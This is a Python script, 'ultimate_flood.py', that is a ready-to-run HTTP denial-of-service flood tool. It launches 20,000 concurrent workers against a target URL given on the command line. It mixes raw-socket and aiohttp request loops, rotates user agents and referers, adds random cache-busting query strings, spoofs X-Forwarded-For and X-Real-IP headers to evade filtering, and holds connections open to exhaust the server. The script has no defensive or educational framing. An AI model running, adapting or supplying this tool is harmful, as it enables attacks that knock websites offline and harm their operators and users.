import asyncio
import random
import string
import time
import aiohttp
import socket
import ssl
import certifi
import urllib.parse
from collections import deque

class UltimateFlood:
    def __init__(self, url, duration, workers=20000):
        self.url = url
        self.duration = duration
        self.workers = workers
        self.counter = 0
        self.failed = 0
        self.lock = asyncio.Lock()
        self.stop_event = False
        self.ssl_context = self._create_ssl_context()
        parsed = urllib.parse.urlparse(url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        self.path = parsed.path or '/'
        self.host = parsed.netloc
        self.port = 443 if parsed.scheme == 'https' else 80
        self.connection_pool = deque(maxlen=workers*3)
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36 Edg/125.0.2535.92",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.112 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
            "Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36"
        ]
        
        self.referers = [
            "https://www.google.com/",
            "https://www.youtube.com/",
            "https://www.facebook.com/",
            "https://www.amazon.com/",
            "https://www.reddit.com/",
            "https://www.twitter.com/",
            "https://www.instagram.com/",
            "https://www.linkedin.com/",
            "https://www.pinterest.com/",
            "https://www.tiktok.com/",
            "https://www.yahoo.com/",
            "https://www.bing.com/"
        ]
        
        self.cookies = {
            'session': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'id': str(random.randint(1000000000, 9999999999)),
            'tracking': 'true',
            'consent': 'all',
            'preferences': ''.join(random.choices(string.ascii_lowercase, k=8))
        }

    def _create_ssl_context(self):
        ctx = ssl.create_default_context(cafile=certifi.where())
        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        ctx.set_ciphers('TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256')
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        return ctx

    def _generate_query(self):
        return urllib.parse.urlencode({
            'v': random.randint(1000, 9999),
            'cache': random.randint(1000000000, 9999999999),
            'r': ''.join(random.choices(string.ascii_lowercase, k=8)),
            't': str(int(time.time())),
            'src': random.choice(['web', 'mobile', 'api'])
        })

    def _build_headers(self):
        headers = {
            'Host': self.host,
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'pt-BR,pt;q=0.8']),
            'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate', 'br']),
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
            'Sec-Fetch-User': '?1',
            'Referer': random.choice(self.referers),
            'X-Requested-With': random.choice(['XMLHttpRequest', '']),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'TE': 'trailers',
            'Cookie': '; '.join([f'{k}={v}' for k, v in self.cookies.items()])
        }
        return headers

    async def _socket_attack(self):
        while not self.stop_event:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                if self.port == 443:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
                sock.connect((self.host, self.port))
                
                query = self._generate_query()
                headers = self._build_headers()
                
                request = f"GET {self.path}?{query} HTTP/1.1\r\n"
                for k, v in headers.items():
                    request += f"{k}: {v}\r\n"
                request += "\r\n"
                
                sock.sendall(request.encode())
                sock.recv(1)
                
                async with self.lock:
                    self.counter += 1
                
                self.connection_pool.append(sock)
            except:
                async with self.lock:
                    self.failed += 1

    async def _http2_attack(self):
        connector = aiohttp.TCPConnector(
            limit=0,
            ssl=self.ssl_context,
            force_close=False,
            enable_cleanup_closed=True
        )
        
        timeout = aiohttp.ClientTimeout(total=3)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'Connection': 'keep-alive'},
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        ) as session:
            
            while not self.stop_event:
                try:
                    params = {self._generate_query(): ''}
                    headers = self._build_headers()
                    
                    async with session.get(
                        self.url,
                        params=params,
                        headers=headers,
                        allow_redirects=True,
                        compress=False,
                        verify_ssl=False
                    ) as response:
                        await response.read()
                        async with self.lock:
                            self.counter += 1
                except:
                    async with self.lock:
                        self.failed += 1

    async def run(self):
        tasks = []
        for _ in range(int(self.workers * 0.7)):
            tasks.append(asyncio.create_task(self._socket_attack()))
        for _ in range(int(self.workers * 0.3)):
            tasks.append(asyncio.create_task(self._http2_attack()))
        
        await asyncio.sleep(self.duration)
        self.stop_event = True
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        for sock in self.connection_pool:
            try:
                sock.close()
            except:
                pass
        
        return {'total': self.counter, 'failed': self.failed}

async def main():
    import sys
    if len(sys.argv) != 3:
        print("Usage: python3 ultimate_flood.py <url> <duration>")
        sys.exit(1)
    
    url = sys.argv[1]
    duration = int(sys.argv[2])
    
    flood = UltimateFlood(url, duration)
    stats = await flood.run()
    
    print(f"Total Requests: {stats['total']}")
    print(f"Failed Requests: {stats['failed']}")

if __name__ == '__main__':
    asyncio.run(main())
